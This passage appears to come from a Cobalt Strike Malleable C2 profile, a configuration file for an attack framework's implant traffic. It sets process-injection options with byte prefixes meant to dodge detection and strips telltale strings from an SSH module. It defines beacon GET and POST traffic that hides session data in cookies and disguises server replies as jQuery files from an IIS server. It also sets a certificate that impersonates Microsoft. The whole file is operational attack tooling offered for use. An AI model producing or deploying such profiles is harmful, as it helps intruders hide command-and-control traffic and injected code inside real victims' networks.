        strrep "SSHAgent" "The current receive window is full, data ignored" "";
        strrep "SSHAgent" "Remote sent more data than current window allows, truncating" "";
        strrep "SSHAgent" "received request type" "";
        strrep "SSHAgent" "Channel " "";
        strrep "SSHAgent" "Exit signal" "";
        strrep "SSHAgent" "received exit signal for channel" "";
        strrep "SSHAgent" "Recved" "";
        strrep "SSHAgent" "bytes to" "";
        strrep "SSHAgent" "bytes at" "";
        strrep "SSHAgent" "Key type not supported" "";
        strrep "SSHAgent" "rijndael-cbc@lysator.liu.se" "";
        strrep "SSHAgent" "hmac-ripemd160@openssh.com" "";
    }
}

###############################################################################
## Process Injection
###############################################################################

process-inject {
    set steal_token "true";    # هذا قد يكون مكرراً إذا وضعته في العام، يمكن إزالته من هنا
    set allocator "VirtualAllocEx";
    set threadhint "ntdll.dll!RtlUserThreadStart+0x21";
    set startrwx "false";
    set userwx "false";
    set min_alloc "16384";
    
    transform-x86 {
        prepend "\x90\x90";
    }
    
    transform-x64 {
        prepend "\x66\x87\xd2\x44\x48\x40\x90\x66\x87\xc9\x46\x66\x0f\x1f\x04\x00\x0f\x1f\x00\x45\x0f\x1f\x04\x00\x41\x87\xdb\x66\x87\xdb\x40\x42\x49\x87\xd2\x43\x4c\x87\xc9\x0f\x1f\x00\x47\x66\x90\x0f\x1f\x00";
    }
}

###############################################################################
## HTTP-GET Profile - Multiple URIs (مع نصوص مبسطة لتجنب /)
###############################################################################

http-get {
    set uri "/css3/index2.shtml";
    set uri "/compare/v1.44/VXK7P0GBE8";
    set verb "GET";
    
    client {
        header "Accept" "image/*, application/json, text/html";
        header "Accept-Language" "en-US,en;q=0.9,nb;q=0.8";
        header "Accept-Encoding" "gzip, deflate, br";
        header "Access-X-Control" "True";
        
        metadata {
            base64url;
            prepend "SESSIONID_XVQDOC55VSGX3JM=";
            header "Cookie";
        }
    }
    
    server {
        header "Server" "Microsoft-IIS/10.0";
        header "X-Powered-By" "ASP.NET";
        header "Cache-Control" "no-cache, max-age=0";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";
        
        output {
            base64url;
            # تم تبسيط النص لتجنب الأحرف الخاصة
            prepend "/* jQuery v3.4.1 */ (function(){ /* minified */ })();";
            print;
        }
    }
}

###############################################################################
## HTTP-POST Profile - Multiple URIs
###############################################################################

http-post {
    set uri "/tools/family.html";
    set uri "/Construct/v1.85/JDX894ZM2WF1";
    set verb "POST";
    
    client {
        header "Accept" "application/xml, application/xhtml+xml, application/json";
        header "Accept-Language" "en-US,en;q=0.9,nb;q=0.8";
        header "Accept-Encoding" "gzip, deflate, identity";
        header "Content-Type" "application/x-www-form-urlencoded";
        header "DNT" "1";
        header "Access-X-Control" "True";
        
        id {
            base64url;
            prepend "token=";
            header "Cookie";
        }
        
        output {
            base64url;
            prepend "data=";
            print;
        }
    }
    
    server {
        header "Server" "Microsoft-IIS/10.0";
        header "X-Powered-By" "ASP.NET";
        header "Cache-Control" "no-cache, max-age=0";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";
        
        output {
            base64url;
            # تم تبسيط النص
            prepend "/* jQuery UI - v1.12.1 */ (function(){ /* minified */ })();";
            print;
        }
    }
}

###############################################################################
## HTTPS Certificate
###############################################################################

https-certificate {
    set CN "*.azureedge.net";
    set O "Microsoft Corporation";
    set C "US";
    set L "Redmond";
    set ST "WA";
    set OU "Organizational Unit";
    set validity "365";
    
    # For imported certificate
    # set keystore "domain.store";
    # set password "password";
}
